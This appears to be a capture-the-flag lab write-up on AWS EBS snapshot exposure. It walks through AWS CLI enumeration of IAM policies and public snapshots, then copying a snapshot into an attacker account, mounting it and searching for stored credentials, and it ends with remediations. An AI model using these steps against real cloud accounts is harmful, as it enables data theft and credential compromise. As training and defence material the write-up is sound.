https://pwnedlabs.io/labs/loot-public-ebs-snapshots

---
## Vulnerability Summary
The environment is vulnerable to **Information Disclosure** and **Unauthorized Data Access** via the exposure of public Elastic Block Store (EBS) snapshots.

1. **Public Snapshot Exposure**: EBS snapshots were explicitly marked as public 
   (`createVolumePermission` set to `All`), allowing any AWS user to create 
   volumes from these snapshots.
2. **Excessive Permissions**: The `intern` user possessed broad `ec2:DescribeSnapshots` 
   permissions, which allowed for the discovery and enumeration of snapshots 
   owned by the target account.
3. **Data Exfiltration**: By creating a volume from a public snapshot in an 
   attacker-controlled account, the attacker could mount the file system to 
   an EC2 instance.
4. **Impact**: Accessing the raw volume data allowed the attacker to bypass 
   instance-level security, potentially revealing sensitive stored credentials 
   (e.g., `~/.aws/credentials`) and internal data, leading to a complete 
   system compromise.

---
## Walkthrough
Use the provided creds to enumerate the IAM user, ARN, and the user's policies:

```bash
aws configure --profile ebs
aws sts get-caller-identity --profile ebs        
	intern
aws iam list-attached-user-policies --user-name intern --profile ebs
	PublicSnapper
```

Enumerate the PublicSnapper policy:

```bash
aws iam get-policy --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper --profile ebs
	v9
aws iam get-policy-version --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper --version-id v9 --profile ebs
	ec2:DescribeSnapshots
```

Now we know we can enumerate all EBS Snapshots. Providing we have the AWS Account ID (which we do):

```bash
aws ec2 describe-snapshots --owner-ids 104506445608 --region us-east-1 --profile ebs
	SnapshotId
```

We need to check who has `createVolumePermission` on these snapshots:

```bash
aws ec2 describe-snapshot-attribute --attribute createVolumePermission --snapshot-id <snap-0123456789> --region us-east-1 --profile ebs
	Group : All
```

We see for the snapshot that the value of `Group` is set to `all`. This means any AWS user can create a volume from this public snapshot into their AWS account.
Also, enumerate public snapshots that have `restorable-by-user-ids` set to `all`:

```bash
aws ec2 describe-snapshots --owner-id self --restorable-by-user-ids all --no-paginate --region us-east-1 --profile ebs
```

EXFILTRATE: create a volume of EBS public snapshot: `AWS Console > select region us-east-1 > EC2 Service > Snapshots > Public snapshots > Snapshot ID = snap-0123456789 > Actions > Create volume from snapshot`

Then, SSH into the EC2 instance and mount the volume. Enumerate for more AWS creds and the flag.

---
## Remediations
1. **Restrict Snapshot Visibility**:
   - Immediately audit all EBS snapshots and set their permissions to `Private`. 
     Use the `ModifySnapshotAttribute` API to remove `All` from the 
     `createVolumePermission` attribute.
2. **IAM Least Privilege**:
   - Restrict `ec2:DescribeSnapshots` and related permissions to specific 
     authorized users. Ensure that developers or interns do not have broad 
     read access to snapshot metadata.
3. **Data Protection & Encryption**:
   - Always encrypt EBS snapshots using `AWS KMS` customer-managed keys. Even if 
     an encrypted snapshot is accidentally made public, it cannot be mounted 
     without authorized access to the associated KMS key.
4. **Monitoring & Governance**:
   - Implement **AWS Config** rules to automatically detect and notify 
     administrators when an EBS snapshot is modified to be public.
   - Use `GuardDuty` to monitor for unusual volume creation activity that may 
     indicate an attacker attempting to access data from snapshots.